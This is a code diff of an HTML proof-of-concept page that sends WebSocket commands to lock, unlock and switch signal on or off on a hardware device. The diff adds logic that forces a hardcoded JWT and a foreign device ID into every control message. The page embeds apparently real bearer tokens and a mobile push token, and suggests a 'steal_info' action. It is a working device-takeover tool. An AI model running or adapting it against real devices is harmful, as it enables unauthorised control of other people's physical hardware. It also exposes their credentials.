@@ -1,3 +1,9 @@
+<!--
+  This HTML page is a proof of concept for interacting with a WebSocket server.
+  It allows sending predefined messages to the server and displays responses.
+  The JWT and destination are hardcoded for demonstration purposes.
+  Make sure to change the WebSocket URL to the actual server you want to connect to.
+-->
 <!DOCTYPE html>
 <html>
   <head>
@@ -20,48 +26,48 @@
         \"type\":\"CONNECT\",
         \"jwt\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MywidXNlcklkIjoiYmVmMTJlOWI0YTg0OGQwYTEzOTdhMWUxIiwiYmxlIjoiQjA4Qzc1QkIzOUE4IiwiYWdlVmVyaWZpZWQiOnRydWUsImlhdCI6MTc0OTc0NzMzMCwiZXhwIjoxNzUyMzM5MzMwfQ.MJiqelFOrwzSCOyBXphHi1j9k7wOtvrjfqP8_ls6DaMmz9eFRFj40D8OejagL3WzBsmyKX7_piTDI67UA9Lr6rU36lo4dlvsiX5FqkL9xr8vA-TS58hd9hrVzJteab_kixTvQZwR_lc4QCxQCenGWe_BZsh3-efV2df6qQ1qtDxuKhOMFbHA8JjZTVaK3sIG5dTcn5qD4S3UOR4PY29SLi4pIXU0MFXlrZua69JHJTUpCBBQredp4reYtzah4_zHqmx5y3MzLl351BnOdVYfHNbybImbPI1rA-izQp6T8LSbqTBJ5Fy-3L5uKnlWOvrow0HgUQvzAqTvkCuBAsogpA\",
         \"body\":\"{\\\"mobile_device\\\":{\\\"token\\\":\\\"a36b64e823aae029647d9779b96764fc90124ff58d5f2af6b5e2cdbd1edba67a\\\",\\\"type\\\":\\\"iOS\\\",\\\"os\\\":\\\"18.2.1\\\"}}\"
-      }`)'>CONNECT</button>
+      }`, "N/A")'>CONNECT</button>
 
       <button onclick='sendQuick(`{
         \"type\":\"KEEP_ALIVE\",
         \"jwt\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MywidXNlcklkIjoiYmVmMTJlOWI0YTg0OGQwYTEzOTdhMWUxIiwiYmxlIjoiQjA4Qzc1QkIzOUE4IiwiYWdlVmVyaWZpZWQiOnRydWUsImlhdCI6MTc0OTc0NzMzMCwiZXhwIjoxNzUyMzM5MzMwfQ.MJiqelFOrwzSCOyBXphHi1j9k7wOtvrjfqP8_ls6DaMmz9eFRFj40D8OejagL3WzBsmyKX7_piTDI67UA9Lr6rU36lo4dlvsiX5FqkL9xr8vA-TS58hd9hrVzJteab_kixTvQZwR_lc4QCxQCenGWe_BZsh3-efV2df6qQ1qtDxuKhOMFbHA8JjZTVaK3sIG5dTcn5qD4S3UOR4PY29SLi4pIXU0MFXlrZua69JHJTUpCBBQredp4reYtzah4_zHqmx5y3MzLl351BnOdVYfHNbybImbPI1rA-izQp6T8LSbqTBJ5Fy-3L5uKnlWOvrow0HgUQvzAqTvkCuBAsogpA\"
-      }`)'>KEEP_ALIVE</button>
+      }`, "N/A")'>KEEP_ALIVE</button>
       
-      <button onclick='sendQuick(`{
+      <!-- <button onclick='sendQuick(`{
         \"jwt\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MywidXNlcklkIjoiYmVmMTJlOWI0YTg0OGQwYTEzOTdhMWUxIiwiYmxlIjoiQjA4Qzc1QkIzOUE4IiwiYWdlVmVyaWZpZWQiOnRydWUsImlhdCI6MTc0OTc0NzMzMCwiZXhwIjoxNzUyMzM5MzMwfQ.MJiqelFOrwzSCOyBXphHi1j9k7wOtvrjfqP8_ls6DaMmz9eFRFj40D8OejagL3WzBsmyKX7_piTDI67UA9Lr6rU36lo4dlvsiX5FqkL9xr8vA-TS58hd9hrVzJteab_kixTvQZwR_lc4QCxQCenGWe_BZsh3-efV2df6qQ1qtDxuKhOMFbHA8JjZTVaK3sIG5dTcn5qD4S3UOR4PY29SLi4pIXU0MFXlrZua69JHJTUpCBBQredp4reYtzah4_zHqmx5y3MzLl351BnOdVYfHNbybImbPI1rA-izQp6T8LSbqTBJ5Fy-3L5uKnlWOvrow0HgUQvzAqTvkCuBAsogpA\",
         \"type\":\"REQUEST\",
         \"createdAt\":1749658438999,
         \"body\":\"{\\\"type\\\":42,\\\"data\\\":{\\\"pairedDevices\\\":[\\\"6A8F9C44-B356-4F18-87C2-91EAEFC47DF0\\\"]}}\" 
-      }`)'>REQUEST (pairedDevices)</button>
+      }`, "N/A")'>REQUEST (pairedDevices)</button> -->
     </div>
 
     <button onclick='sendQuick(`{
-      \"jwt\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MywidXNlcklkIjoiYmVmMTJlOWI0YTg0OGQwYTEzOTdhMWUxIiwiYmxlIjoiQjA4Qzc1QkIzOUE4IiwiYWdlVmVyaWZpZWQiOnRydWUsImlhdCI6MTc0OTc0NzMzMCwiZXhwIjoxNzUyMzM5MzMwfQ.MJiqelFOrwzSCOyBXphHi1j9k7wOtvrjfqP8_ls6DaMmz9eFRFj40D8OejagL3WzBsmyKX7_piTDI67UA9Lr6rU36lo4dlvsiX5FqkL9xr8vA-TS58hd9hrVzJteab_kixTvQZwR_lc4QCxQCenGWe_BZsh3-efV2df6qQ1qtDxuKhOMFbHA8JjZTVaK3sIG5dTcn5qD4S3UOR4PY29SLi4pIXU0MFXlrZua69JHJTUpCBBQredp4reYtzah4_zHqmx5y3MzLl351BnOdVYfHNbybImbPI1rA-izQp6T8LSbqTBJ5Fy-3L5uKnlWOvrow0HgUQvzAqTvkCuBAsogpA\",
+      \"jwt\":\"JWT_HERE\",
       \"type\": \"REQUEST\",
       \"createdAt\": 1749660165852,
-      \"body\": \"{\\\"destination\\\":\\\"6A8F9C44-B356-4F18-87C2-91EAEFC47DF0\\\",\\\"type\\\":30,\\\"data\\\":{\\\"id\\\":4000000}}\"
-    }`)'>🔒 Lock HW Device</button>
+      \"body\": \"{\\\"destination\\\":\\\"DEST_HERE\\\",\\\"type\\\":30,\\\"data\\\":{\\\"id\\\":4000000}}\"
+    }`, "Lock")'>🔒 Lock HW Device</button>
 
     <button onclick='sendQuick(`{
-      \"jwt\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MywidXNlcklkIjoiYmVmMTJlOWI0YTg0OGQwYTEzOTdhMWUxIiwiYmxlIjoiQjA4Qzc1QkIzOUE4IiwiYWdlVmVyaWZpZWQiOnRydWUsImlhdCI6MTc0OTc0NzMzMCwiZXhwIjoxNzUyMzM5MzMwfQ.MJiqelFOrwzSCOyBXphHi1j9k7wOtvrjfqP8_ls6DaMmz9eFRFj40D8OejagL3WzBsmyKX7_piTDI67UA9Lr6rU36lo4dlvsiX5FqkL9xr8vA-TS58hd9hrVzJteab_kixTvQZwR_lc4QCxQCenGWe_BZsh3-efV2df6qQ1qtDxuKhOMFbHA8JjZTVaK3sIG5dTcn5qD4S3UOR4PY29SLi4pIXU0MFXlrZua69JHJTUpCBBQredp4reYtzah4_zHqmx5y3MzLl351BnOdVYfHNbybImbPI1rA-izQp6T8LSbqTBJ5Fy-3L5uKnlWOvrow0HgUQvzAqTvkCuBAsogpA\",
+      \"jwt\":\"JWT_HERE\",
       \"type\": \"REQUEST\",
       \"createdAt\": 1749660186071,
-      \"body\": \"{\\\"destination\\\":\\\"6A8F9C44-B356-4F18-87C2-91EAEFC47DF0\\\",\\\"type\\\":30,\\\"data\\\":{\\\"id\\\":4000001}}\"
-    }`)'>🔓 Unlock</button>
+      \"body\": \"{\\\"destination\\\":\\\"DEST_HERE\\\",\\\"type\\\":30,\\\"data\\\":{\\\"id\\\":4000001}}\"
+    }`, "Unlock")'>🔓 Unlock</button>
 
     <button onclick='sendQuick(`{
-      \"jwt\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MywidXNlcklkIjoiYmVmMTJlOWI0YTg0OGQwYTEzOTdhMWUxIiwiYmxlIjoiQjA4Qzc1QkIzOUE4IiwiYWdlVmVyaWZpZWQiOnRydWUsImlhdCI6MTc0OTc0NzMzMCwiZXhwIjoxNzUyMzM5MzMwfQ.MJiqelFOrwzSCOyBXphHi1j9k7wOtvrjfqP8_ls6DaMmz9eFRFj40D8OejagL3WzBsmyKX7_piTDI67UA9Lr6rU36lo4dlvsiX5FqkL9xr8vA-TS58hd9hrVzJteab_kixTvQZwR_lc4QCxQCenGWe_BZsh3-efV2df6qQ1qtDxuKhOMFbHA8JjZTVaK3sIG5dTcn5qD4S3UOR4PY29SLi4pIXU0MFXlrZua69JHJTUpCBBQredp4reYtzah4_zHqmx5y3MzLl351BnOdVYfHNbybImbPI1rA-izQp6T8LSbqTBJ5Fy-3L5uKnlWOvrow0HgUQvzAqTvkCuBAsogpA\",
+      \"jwt\":\"JWT_HERE\",
       \"type\": \"REQUEST\",
       \"createdAt\": 1749660231367,
-      \"body\": \"{\\\"destination\\\":\\\"6A8F9C44-B356-4F18-87C2-91EAEFC47DF0\\\",\\\"type\\\":30,\\\"data\\\":{\\\"id\\\":122,\\\"extra\\\":\\\"dA==\\\"}}\"
-    }`)'>📶 Signal On</button>
+      \"body\": \"{\\\"destination\\\":\\\"DEST_HERE\\\",\\\"type\\\":30,\\\"data\\\":{\\\"id\\\":122,\\\"extra\\\":\\\"dA==\\\"}}\"
+    }`, "Signal_Off")'>📶 Signal On</button>
 
     <button onclick='sendQuick(`{
-      \"jwt\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MywidXNlcklkIjoiYmVmMTJlOWI0YTg0OGQwYTEzOTdhMWUxIiwiYmxlIjoiQjA4Qzc1QkIzOUE4IiwiYWdlVmVyaWZpZWQiOnRydWUsImlhdCI6MTc0OTc0NzMzMCwiZXhwIjoxNzUyMzM5MzMwfQ.MJiqelFOrwzSCOyBXphHi1j9k7wOtvrjfqP8_ls6DaMmz9eFRFj40D8OejagL3WzBsmyKX7_piTDI67UA9Lr6rU36lo4dlvsiX5FqkL9xr8vA-TS58hd9hrVzJteab_kixTvQZwR_lc4QCxQCenGWe_BZsh3-efV2df6qQ1qtDxuKhOMFbHA8JjZTVaK3sIG5dTcn5qD4S3UOR4PY29SLi4pIXU0MFXlrZua69JHJTUpCBBQredp4reYtzah4_zHqmx5y3MzLl351BnOdVYfHNbybImbPI1rA-izQp6T8LSbqTBJ5Fy-3L5uKnlWOvrow0HgUQvzAqTvkCuBAsogpA\",
+      \"jwt\":\"JWT_HERE\",
       \"type\": \"REQUEST\",
       \"createdAt\": 1749660240142,
-      \"body\": \"{\\\"destination\\\":\\\"6A8F9C44-B356-4F18-87C2-91EAEFC47DF0\\\",\\\"type\\\":30,\\\"data\\\":{\\\"id\\\":122,\\\"extra\\\":\\\"Zg==\\\"}}\"
-    }`)'>🚫 Signal Off</button>
+      \"body\": \"{\\\"destination\\\":\\\"DEST_HERE\\\",\\\"type\\\":30,\\\"data\\\":{\\\"id\\\":122,\\\"extra\\\":\\\"Zg==\\\"}}\"
+    }`, "Signal_Off")'>🚫 Signal Off</button>
 
 
     <input type="text" id="msgInput" placeholder='Type message (e.g. {"action":"steal_info"})' style="width: 80%;" />
@@ -72,6 +78,8 @@
 
     <script>
       let ws;
+      let jwt = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MywidXNlcklkIjoiYmVmMTJlOWI0YTg0OGQwYTEzOTdhMWUxIiwiYmxlIjoiQjA4Qzc1QkIzOUE4IiwiYWdlVmVyaWZpZWQiOnRydWUsImlhdCI6MTc0OTc0NzMzMCwiZXhwIjoxNzUyMzM5MzMwfQ.MJiqelFOrwzSCOyBXphHi1j9k7wOtvrjfqP8_ls6DaMmz9eFRFj40D8OejagL3WzBsmyKX7_piTDI67UA9Lr6rU36lo4dlvsiX5FqkL9xr8vA-TS58hd9hrVzJteab_kixTvQZwR_lc4QCxQCenGWe_BZsh3-efV2df6qQ1qtDxuKhOMFbHA8JjZTVaK3sIG5dTcn5qD4S3UOR4PY29SLi4pIXU0MFXlrZua69JHJTUpCBBQredp4reYtzah4_zHqmx5y3MzLl351BnOdVYfHNbybImbPI1rA-izQp6T8LSbqTBJ5Fy-3L5uKnlWOvrow0HgUQvzAqTvkCuBAsogpA";
+      let destination = "E891BF57-4139-494C-8F8F-930B6BAE59F2";
       const logDiv = document.getElementById("log");
       const statusEl = document.getElementById("status");
 
@@ -138,15 +146,42 @@
         }
       }
 
-      function sendQuick(payload) {
+    function sendQuick(payload, action) {
+      try {
+        const controlActions = ["Signal_Off", "Signal_On", "Lock", "Unlock"];
+        const shouldInject = controlActions.includes(action);
+
+        const obj = JSON.parse(payload);
+
+        if (shouldInject) {
+          // Always override jwt
+          obj.jwt = jwt;
+
+          // Always update destination if body exists
+          if (obj.body) {
+            let bodyObj = JSON.parse(obj.body);
+
+            bodyObj.destination = destination; // add or override
+
+            obj.body = JSON.stringify(bodyObj);
+          } else {
+            // If no body, create one with destination
+            obj.body = JSON.stringify({ destination });
+          }
+        }
+
+        const finalPayload = JSON.stringify(obj);
+
         if (ws.readyState === WebSocket.OPEN) {
-          ws.send(payload);
-          log("[Quick] → " + payload);
-          log(payload, true);
+          ws.send(finalPayload);
+          log(`[Quick: ${action}] → ` + finalPayload);
         } else {
           log("[!] WebSocket not connected.");
         }
+      } catch (err) {
+        log("[!] sendQuick() error: " + err.message);
       }
+    }
 
       function reconnect() {
         log("[~] Reconnecting...");
